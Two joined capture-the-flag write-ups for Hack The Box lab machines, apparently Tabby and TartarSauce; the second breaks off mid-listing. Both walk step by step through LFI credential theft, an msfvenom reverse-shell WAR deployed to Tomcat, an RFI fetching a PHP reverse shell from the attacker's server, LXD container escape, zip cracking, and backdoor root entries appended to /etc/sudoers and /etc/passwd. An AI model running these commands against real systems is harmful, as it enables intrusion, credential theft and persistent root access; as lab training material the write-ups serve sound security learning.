The next thing to test for is Remote File Inclusion \(RFI\). RFI is similar to LFI, except that it instead allows an attacker to include remote files. This is way more dangerous than an LFI. There are several methods you can try to turn an LFI to an RFI. I have documented them in detail in the [Poison writeup](https://medium.com/swlh/hack-the-box-poison-writeup-w-o-metasploit-a6acfdf52ac5). For this blog, I will test it using the PHP http:// wrapper.

First, start a simple python server on the attack machine.

```text
python -m SimpleHTTPServer 5555
```

Second, attempt to run a file hosted on the server.

![Image for post](https://miro.medium.com/max/1255/1*G2MBRIcjJkDQxMFcjsT4mA.png)

We can see that there was no attempt to download the file.

![Image for post](https://miro.medium.com/max/675/1*1b_syKVxFpverkHEy_IU9A.png)

So it’s not likely to be vulnerable to RFI. Therefore, let’s focus on the LFI vulnerability. The [PayloadsAllTheThings repository on GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders) has a list of LFI payloads that you could try to potentially get useful information about the box the web server is running on. However, the first thing I would like to see is the source code of the _news.php_ script to determine what caused the LFI vulnerability.

If we simply try adding “_news.php_” in the file parameter, we get nothing indicating that the script is not placed in the current directory. Next, let’s try the parent of the current directory.

![Image for post](https://miro.medium.com/max/1976/1*OpqG9narJGkSaa2zbHV1pg.png)

We get the source code! Let’s do a quick code review.

* **Line 10:** Takes in the content of the file URL parameter and saves it in the $file parameter.
* **Line 11:** Takes in the content of the $file parameter, appends it to the directory _files_ and attempts to open the file at that location.
* **Lines 12–14:** Output the content of the file.

The LFI vulnerability is introduced in Line 11 since the $file parameter is a user-controlled input that is not sanitized. Discovering the reason behind the vulnerability is a bit of a detour from solving the box, however, it is important to understand why things work the way they do.

Going back, how can we use the LFI vulnerability to get code execution on the box? Well, when we visited the Tomcat server running on port 8080, it gave us the location of the _tomcat-users.xml_ file. Depending on the configuration, this file could contain the list of user names, roles, and passwords.

![Image for post](https://miro.medium.com/max/1363/1*KSle0L9Ga0_pKYXe4hx0bA.png)

Let’s use the LFI vulnerability to output the content of the file.

![Image for post](https://miro.medium.com/max/1235/1*iQig_lI8x5wvTJwv2k4inw.png)

This outputs nothing which leads us to believe that the file is in a different location. From the nmap scans, we do know that the OS is Ubuntu and the version of Tomcat installed is version 9. We also know that the Apache version is 2.4.41. So let’s try to use all that information to narrow down the exact Ubuntu release.

Googling “Apache 2.4.41 ubuntu”, leads us to [this page](https://packages.ubuntu.com/search?keywords=apache2). The only packages that support 2.4.41 are [eoan \(19.10\)](https://packages.ubuntu.com/eoan/apache2) and [focal \(20.04LTS\)](https://packages.ubuntu.com/focal/apache2). Let’s go with eoan \(you’ll arrive to the same result if you choose focal\). Googling “eoan tomcat9”, leads us to [this page](https://packages.ubuntu.com/eoan/tomcat9). Scroll down and click on [list of files](https://packages.ubuntu.com/eoan/all/tomcat9/filelist). From there, we see that the location of the _tomcat-users.xml_ file is as follows.

```text
/usr/share/tomcat9/etc/tomcat-users.xml
```

Use the above location to output the content of the file.

![Image for post](https://miro.medium.com/max/2538/1*NCz6J7-aqJFlV98_PoLNJw.png)

As can be seen in the above figure, there’s a user with the username “tomcat” and the password “$3cureP4s5w0rd123!”. The user also has the roles “admin-gui,manager-script”. Looking at the tomcat documentation, the following are the descriptions of the roles:

* **admin-gui:** gives the user the ability to configure the Host Manager application using the graphical web interface.
* **manager-script:** gives the user the ability to configure the Manager application using the text interface instead of the graphical web interface.

Therefore, if we try to log into the manager interface using the GUI, it won’t work. Instead, we’ll have to do it using the command line.

Before we do that, let’s first generate a war file that contains a reverse shell.

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.12 LPORT=53 -f war > rkhal101.war
```

Next, use curl to upload the war file to the tomcat manager interface.

```text
curl -u "tomcat:\$3cureP4s5w0rd123!" --upload-file rkhal101.war http://10.10.10.194:8080/manager/text/deploy?path=/rkhal101
```

* **-u:** username:password
* **— upload-file:** the path to the file to upload

The URL to deploy the file can be found on the official [tomcat documentation](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_%28WAR%29_Remotely). Note that we had to escape the $ sign in the password for the password to be interpreted correctly.

The above command gives us a success message.

```text
OK - Deployed application at context path [/rkhal101]
```

We can also see the list applications using the following command.

```text
curl -u "tomcat:\$3cureP4s5w0rd123!" http://10.10.10.194:8080/manager/text/list
```

Next, setup a listener to receive the reverse shell.

```text
sudo nc -nlvp 53
```

Then call the deployed war file.

```text
curl http://10.10.10.194:8080/rkhal101/
```

We get a shell!

![Image for post](https://miro.medium.com/max/1036/1*CWiY-OCjhkTm7t5tq3-DuA.png)

Let’s upgrade it to a better shell.

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “_fg_” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the _tomcat_ user and we don’t have privileges to view the _user.txt_ flag. Therefore, we need to escalate our privileges.

## **Privilege Escalation** <a id="5805"></a>

The first thing to do when you get initial access on the box is to enumerate the filesystem to see if there are any cleartext passwords. While doing that, we find a backup file that is encrypted.

```text
tomcat@tabby:/var/www/html/files$ unzip 16162020_backup.zip Archive:  16162020_backup.zip
checkdir error:  cannot create var
                 Read-only file system
                 unable to process var/www/html/assets/.
[16162020_backup.zip] var/www/html/favicon.ico password:
```

The fact that it is password protected means that it contains sensitive information. So let’s transfer the file back to our attack machine.

Setup a python server on the target machine.

```text
python3 -m http.server 5555
```

Then download the zip file on the attack machine.

```text
wget http://10.10.10.194:5555/16162020_backup.zip
```

Use fcrackzip to crack the password.

```text
rana@kali:~/Desktop/htb/tabby/user$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip possible pw found: admin@it ()
```

It discovers the password! Use it to unzip the file.

```text
unzip 16162020_backup.zip
```

Going through the content of the files, we don’t find anything useful. However, we do have a new password. So let’s see if it was reused anywhere on the target system. First, let’s try to su into the ash user.

```text
tomcat@tabby:/var/lib/tomcat9$ su ash
Password: 
ash@tabby:/var/lib/tomcat9$ whoami
ash
```

It works, we’re now running as _ash_. Let’s view the _user.txt_ file.

![Image for post](https://miro.medium.com/max/914/1*QHIWHXWgWI1w00MDZ6mdNQ.png)

Now we need to escalate our privileges to root. Let’s view the groups that the user is a part of.

```text
sh@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

The _lxd_ group is particularly interesting. LXD is Ubuntu’s system container manager. This is similar to virtual machines, however, instead using linux containers. As described in [this link](https://reboare.github.io/lxd/lxd-escape.html), the lxd group should be considered harmful in the same way the [docker](https://www.andreas-jung.com/contents/on-docker-security-docker-group-considered-harmful) group is. Any member of the lxd group can immediately escalate their privileges to root on the host operating system.

This in itself is not a bug, but intended functionality as described in this [link](https://materials.rangeforce.com/tutorial/2019/12/07/Privilege-Escalation-Docker-LXD-Groups/).

![Image for post](https://miro.medium.com/max/1724/1*DAXwH9lcDDObaaZNm_yKvQ.png)

There are several ways to exploit this functionality and escalate privileges to root. We’ll do it by mounting the /root filesystem to the container. To do that, we’ll use the “_Exploiting without internet — Method 2_” instructions in [this link](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation).

First, download and build a linux alpine image on the attack machine.

```text
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder/
sudo bash build-alpine
```

Second, transfer the image to the target machine. This can be done by starting a python server on the attack machine.

```text
python -m SimpleHTTPServer 6666
```

Then download the archived file in the _ash_ directory of the target machine.

```text
wget http://10.10.10.194:6666/alpine-v3.12-x86_64-20200826_2058.tar.gz
```

Third, import the image into lxc.

```text
lxc image import ./alpine-v3.12-x86_64-20200826_2058.tar.gz --alias rkhal101
```

**Note:** If you get the following error, run the “lxd init” command and accept all the default configurations. Then rerun the command to import the image into lxc.

![Image for post](https://miro.medium.com/max/1554/1*7VCHnxW4LbV3m-qvZKgIRg.png)

To view the list of images, run the following command.

```text
lxc image list
```

Fourth, run the image.

```text
lxc init rkhal101 rkhal101-container -c security.privileged=true
```

Fifth, mount the the / host directory into the image.

```text
lxc config device add rkhal101-container rkhal101-device disk source=/ path=/mnt/root recursive=true
```

The above command mounts the / host directory into the /mnt/root directory of the container.

Finally, start the container and run a bash shell.

```text
lxc start rkhal101-container
lxc exec rkhal101-container /bin/sh
```

Now we’re running as root in the alpine container \(_NOT_ the host OS\).

![Image for post](https://miro.medium.com/max/914/1*eugdbqqFzC44wzs0NXzMfw.png)

However, we mounted the host “/” directory to the directory “/mnt/root” in the alpine container. So if we visit “/mnt/root”, we can see the content of the “/” directory of the host OS.

![Image for post](https://miro.medium.com/max/1054/1*oK-jF_xpUyLNQdUgzKsh6A.png)

Therefore, we can view the _root.txt_ flag.

![Image for post](https://miro.medium.com/max/856/1*7JzHsycMw4kESSffRqKF3w.png)

Now although we can view the root flag, we’re not done yet! We’re currently root in the container, not the host OS. To truly escalate privileges, we need to escalate privileges on the host OS. There’s about a million ways to do that.

In this blog, we’ll escalate privileges in two ways.

### Way \#1: Enable sudo without password <a id="a152"></a>

In the _/etc/sudoers_ \(in the _/mnt/root_ directory\) file add the following line.

```text
echo "ash     ALL=(ALL) NOPASSWD:ALL" >> etc/sudoers
```

This will allow the ash user to run the sudo command without having to enter a password.

We’ll test this out after we complete way \#2.

### Way \#2: Add an entry in the /etc/passwd file <a id="17c9"></a>

The _/etc/passwd_ file historically contained user password hashes. For backwards compatibility, if the second field of a user row in _/etc/passwd_ contains a password hash, it takes precedent over the hash in _/etc/shadow_. Therefore, we can create a new user and assign them the root user ID \(0\) giving the user root privileges.

Now you might be asking, why not just add an entry or crack an existing password in the /etc/shadow file? You can definitely do that. I wanted to use the /etc/passwd file because not many people are familiar with the backward compatibility feature and therefore don’t check if the file has been misconfigured \(world-writeable\) in a way that would allow privilege escalation.

First, generate a password hash for the password “password” using openssl on the attack machine.

```text
rana@kali:~$ openssl passwd "password"
icmqBaqZ.ZbBU
```

Next, add the following entry to the /etc/passwd file.

```text
echo "root2:icmqBaqZ.ZbBU:0:0:root:/root:/bin/bash" >> etc/passwd
```

Now, if we su into root2 with the set password, we should have root privileges.

Let’s test if our privilege escalation techniques were successful.

First, exit the container using the following command.

```text
/mnt/root # exitash@tabby:~$ whoami
ash
```

To test privilege escalation way \#1, try to run the sudo command.

```text
ash@tabby:~$ sudo cat /etc/shadow
root:[redacted]:18429:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
```

As seen in the above listing, we were allowed to run a privileged command without having to enter a password. So way \#1 was successful.

To test privilege escalation way \#2, try to switch to the root2 user using the password “password”.

```text
ash@tabby:~$ su root2
Password: 
root@tabby:/home/ash#
```

As seen in the above listing, we were able to switch into the root2 user who has root privileges. So way \#2 was also successful!

## Lessons Learned <a id="3bd6"></a>

To gain an initial foothold on the box, we exploited one vulnerability:

1. A Local File Inclusion \(LFI\) vulnerability that allowed us to view files on the host. Using this vulnerability, we were able to view the tomcat-users.xml file which gave us access to the Tomcat Manager interface. This could have been easily avoided if the developer properly validated user input.

To escalate privileges on the box, we exploited three vulnerabilities:

1. Use of a weak password. The backup zip file was password protected with a weak password that we were able to crack in a matter of seconds. The user should have used a sufficiently long password that is not easily crackable.
2. Reuse of passwords. The password we obtained from cracking the backup zip file, was reused to horizontally escalate our privileges to the ash user. The user should have instead used a different strong password for his system account.
3. User part of the LXD group. This technically in itself is not technically a vulnerability but an intended functionality. What likely happened, is that this user previously had some form of admin privileges \(part of the sudo group\) on the system and so when LXD was installed it automatically added that user to the LXD group. However, when these privileges were stripped away from the user to make him a less privileged user, the user remained as part of the lxd group. This is why when it was [reported](https://github.com/lxc/lxd/issues/3844) as a vulnerability, the issue was closed cancelled. The obvious fix to this problem, would be to remove the user from the LXD group.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
tartarsauce-writeup-w-o-metasploit.md
# TartarSauce Writeup w/o Metasploit

![](https://miro.medium.com/max/579/1*qubhjtqsdtBNKNNS4NdBEQ.png)

## Reconnaissance <a id="335d"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.88 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.88
                                                                                                                                      
Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:02 EST
Nmap scan report for 10.10.10.88
Host is up (0.038s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 0.78 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:02 EST
Nmap scan report for 10.10.10.88
Host is up (0.031s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing PageService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:02 EST
Warning: 10.10.10.88 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.88
Host is up (0.031s latency).
All 1000 scanned ports on 10.10.10.88 are open|filtered (958) or closed (42)Nmap done: 1 IP address (1 host up) scanned in 36.95 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:02 EST
Initiating Parallel DNS resolution of 1 host. at 00:02
Completed Parallel DNS resolution of 1 host. at 00:02, 0.01s elapsed
Initiating SYN Stealth Scan at 00:02
Scanning 10.10.10.88 [65535 ports]
Discovered open port 80/tcp on 10.10.10.88
SYN Stealth Scan Timing: About 23.01% done; ETC: 00:05 (0:01:44 remaining)
SYN Stealth Scan Timing: About 45.91% done; ETC: 00:05 (0:01:12 remaining)
SYN Stealth Scan Timing: About 68.80% done; ETC: 00:05 (0:00:41 remaining)
Completed SYN Stealth Scan at 00:05, 131.36s elapsed (65535 total ports)
Nmap scan report for 10.10.10.88
Host is up (0.034s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  httpRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 131.50 seconds
           Raw packets sent: 65666 (2.889MB) | Rcvd: 65542 (2.622MB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                      
Running CVE scan on basic ports
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:05 EST
Nmap scan report for 10.10.10.88
Host is up (0.030s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 secondsRunning Vuln scan on basic ports
                                                                                                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 00:05 EST
Nmap scan report for 10.10.10.88
Host is up (0.029s latency).PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 328.12 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                      
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.88:80 -o recon/gobuster_10.10.10.88_80.txt
nikto -host 10.10.10.88:80 | tee recon/nikto_10.10.10.88_80.txtWhich commands would you like to run?                                                                                                 
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                      
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.88:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/15 00:11:12 Starting gobuster
===============================================================
http://10.10.10.88:80/index.html (Status: 200) [Size: 10766]
http://10.10.10.88:80/webservices (Status: 301) [Size: 316]
http://10.10.10.88:80/server-status (Status: 403) [Size: 299]
===============================================================
2020/01/15 00:43:49 Finished
===============================================================Finished gobuster scan
                                                                                                                                      
=========================
                                                                                                                                      
Starting nikto scan
                                                                                                                                      
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.88
+ Target Hostname:    10.10.10.88
+ Target Port:        80
+ Start Time:         2020-01-15 00:43:50 (GMT-5)
--------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Cookie PHPSESSID created without the httponly flag
+ Entry '/webservices/monstra-3.0.4/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 5 entries which should be manually viewed.
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2a0e, size: 565becf5ff08d, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7883 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2020-01-15 00:49:53 (GMT-5) (363 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                      
=========================
                                                                                                                                      
                                                                                                                                      
                                                                                                                                      
---------------------Finished all Nmap scans---------------------Completed in 47 minute(s) and 46 second(s)
```

Before we move on to enumeration, let’s make some mental notes about the scan results. We have only one port open.

* **Port 80:** running Apache httpd 2.4.18

The nmap/nikto/gobuster scans found the following directories/files: _http-robots.txt_, _index.html_ and _/webservices_.

## Enumeration <a id="bffd"></a>

Visit the web application.

![](https://miro.medium.com/max/1055/1*MBY6ajJPnAguFplMNE0lGA.png)

There’s nothing useful on the _index.html_ page. Let’s view the _robots.txt_ page.

```text
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

It gives us a list of URLs that web robots are instructed not to visit. Only one of these links are valid.

![](https://miro.medium.com/max/1288/1*GDLOpYl9UvpWXQ0OzX3zbw.png)

The application is using a Content Management System \(CMS\) called Monstra and the version is available at the footer of the site \(3.0.4\). Let’s see if it has any known exploits.

![](https://miro.medium.com/max/1369/1*TOGQ4ihEi7pGCeG4zuZ5wA.png)

The version being used is vulnerable to an authenticated RCE exploit. So we first need to find credentials.

Click on the “logged in” link and try the default credentials _admin/admin_.

![](https://miro.medium.com/max/1331/1*05guS59Sx_wJgMLPqsZqGQ.png)

It worked! Copy the RCE exploit into the current directory.

```text
searchsploit -m 43348
```

View the exploit.

![](https://miro.medium.com/max/1214/1*lCp9KBo5WQVwXCcfLUekrQ.png)

It seems like there’s insufficient input validation on the upload files functionality that allows a malicious attacker to upload a PHP script. Let’s try doing that.

I tried a bunch of valid extensions, however, I kept getting a “_File was not uploaded error_”. The upload functionality does not seem to be working at all. So this is a dead end.

We need to enumerate more. Run gobuster on the _webservices_ directory.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -e -u http://10.10.10.88:80/webservices -o 10.10.10.88/recon/extra_gobuster_10.10.10.88_80.txt
```

* **dir:** directory mode
* **-w:** wordlist
* **-l:** include the length of the body in the output
* **-t:** thread count
* **-e:** expanded mode, print full URLs
* **-u:** URL
* **-o:** output file

We get the following output.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.88:80/webservices
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/15 18:33:24 Starting gobuster
===============================================================
http://10.10.10.88:80/webservices/wp (Status: 301) [Size: 319]
===============================================================
2020/01/15 18:44:11 Finished
```

Visit the link.

![](https://miro.medium.com/max/640/1*GgIJ25gtToOuAumnMZq3Pw.png)

This is a WordPress site, so let’s run wpscan on it to determine the version used and enumerate any installed plugins.

```text
wpscan --url http://10.10.10.88:80/webservices/wp -e ap --plugins-detection aggressive --api-token [redacted]
```

* **— url:** the URL of the blog to scan
* **-e ap:** enumerate all plugins
* **— plugins-detection aggressive:** use the aggressive mode
* **— api-token:** personal token for using wpscan

We get the following result.

```text
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________[+] URL: http://10.10.10.88/webservices/wp/
[+] Started: Thu Jan 16 21:40:01 2020Interesting Finding(s):[+] http://10.10.10.88/webservices/wp/
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%[+] http://10.10.10.88/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - ...[+] http://10.10.10.88/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%[+] http://10.10.10.88/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'
 |
 | [!] 25 vulnerabilities identified:
 |
 ...[i] The main theme could not be detected.[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:12:07 <===========================================================================================> (84420 / 84420) 100.00% Time: 00:12:07
[+] Checking Plugin Versions (via Passive and Aggressive Methods)[i] Plugin(s) Identified:[+] akismet
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2019-11-13T20:46:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 |...[+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2019-10-25T15:26:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 3.1.7
....[+] WPVulnDB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 41[+] Finished: Thu Jan 16 21:52:23 2020
[+] Requests Done: 84464
[+] Cached Requests: 8
[+] Data Sent: 22.644 MB
[+] Data Received: 11.401 MB
[+] Memory used: 312.409 MB
[+] Elapsed time: 00:12:21
```

The WordPress version identified is 4.9.4. It has two plugins installed: akismet and gwolle-gb. Let’s check if the gwolle-gb plugin has any vulnerabilities.

![](https://miro.medium.com/max/1417/1*1Apge0-7m0mtVjHzQtfWAg.png)

It is vulnerable to a remote file inclusion \(RFI\). Copy the exploit to the current directory.

```text
searchsploit -m 38861
```

View the exploit.

![](https://miro.medium.com/max/1425/1*mfOZy0urJYekQDYK-XjYQw.png)

The “_abspath_” input parameter being used in the PHP require\(\) function is not properly validated and therefore, a malicious attacker can upload and run a malicious PHP script withe filename _wp-load.php_.

## Initial Foothold <a id="94df"></a>

Get a PHP reverse shell from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and rename it to _wp-load.php_. Start up a simple server where the shell is located.

```text
python -m SimpleHTTPServer 5555
```

Set up a netcat listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 1234
```

Visit the following link with the correct URL to the simple server.

```text
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.12:5555/
```

We get a shell!

![](https://miro.medium.com/max/433/1*Buu5WITctkJPvTeE68ltsA.png)

Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the web daemon user _www-data_ and we don’t have privileges to view the _user.txt_ flag. Therefore, we need to escalate our privileges.

## Privilege Escalation <a id="455b"></a>

Run the following command to view the list of allowed commands the user can run using sudo without a password.

```text
www-data@TartarSauce:/$ sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

As can be seen above, we have the right to run the binary _/bin/tar_ with _onuma_’s privileges. Visit [gotfobins](https://gtfobins.github.io/gtfobins/tar/#sudo) website to see if we can spin up a shell using the tar command.

![](https://miro.medium.com/max/828/1*PNorEB7LVRHjI-uPEbfsqg.png)

Perfect! Run the following command to get a shell running with _onuma_’s privileges.

```text
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/655/1*jUr2sHd5ryedFhHasAoI5w.png)

To view the _root.txt_ flag, we need to escalate our privileges to root.

Let’s transfer the _LinEnum_ script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, change to the _/tmp_ directory where we have write privileges and download the _LinEnum_ script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

We get back the following result.

```text
[-] Systemd timers:
NEXT                         LEFT          LAST                         PASSED      UNIT                         ACTIVATES
Fri 2020-01-17 21:46:48 EST  59s left      Fri 2020-01-17 21:41:48 EST  4min 0s ago backuperer.timer             backuperer.service
Fri 2020-01-17 23:20:44 EST  1h 34min left Fri 2020-01-17 15:01:45 EST  6h ago      apt-daily.timer              apt-daily.service
Sat 2020-01-18 06:20:57 EST  8h left       Fri 2020-01-17 06:18:35 EST  15h ago     apt-daily-upgrade.timer      apt-daily-upgrade.service
Sat 2020-01-18 21:45:29 EST  23h left      Fri 2020-01-17 21:45:29 EST  20s ago     systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
```

I’ve never seen a service called _backuperer.service_ before, so this must be a custom service. Let’s see if it is being run as a scheduled task. Download _pspy32_ and view results.

```text
2020/01/18 14:22:48 CMD: UID=0    PID=14010  | /bin/bash /usr/sbin/backuperer
```

It is being run on a consistent basis. Locate the _backuperer_ file on the target system.

```text
onuma@TartarSauce:/tmp$ locate backuper
/etc/systemd/system/multi-user.target.wants/backuperer.timer
/lib/systemd/system/backuperer.service
/lib/systemd/system/backuperer.timer
/usr/sbin/backuperer
```

View the _backuperer.timer_ file.

```text
[Unit]
Description=Runs backuperer every 5 mins[Timer]
# Time to wait after booting before we run first time
OnBootSec=5min
# Time between running each consecutive time
OnUnitActiveSec=5min
Unit=backuperer.service[Install]
WantedBy=multi-user.target
```

The service is run every 5 minutes. Next, view _backuperer_ binary file.

```text
onuma@TartarSauce:/tmp$ cat /usr/sbin/backuperer                   
#!/bin/bash#-------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
